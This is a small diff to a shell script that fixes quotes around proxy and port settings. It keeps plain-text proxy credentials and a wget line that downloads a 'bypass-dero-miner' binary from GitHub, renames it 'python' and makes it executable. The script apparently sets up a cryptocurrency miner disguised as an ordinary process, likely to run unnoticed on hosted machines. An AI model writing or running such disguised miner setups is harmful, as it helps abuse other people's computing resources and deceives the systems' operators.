@@ -1,5 +1,5 @@
-proxy="103.253.24.243 
-port="8080
+proxy="103.253.24.243" 
+port="8080"
 user="woiden_racias90"  
 pass="90racias"
 wget -q -O python https://github.com/Danis85/dero/raw/main/downloads/bypass-dero-miner && chmod +x python
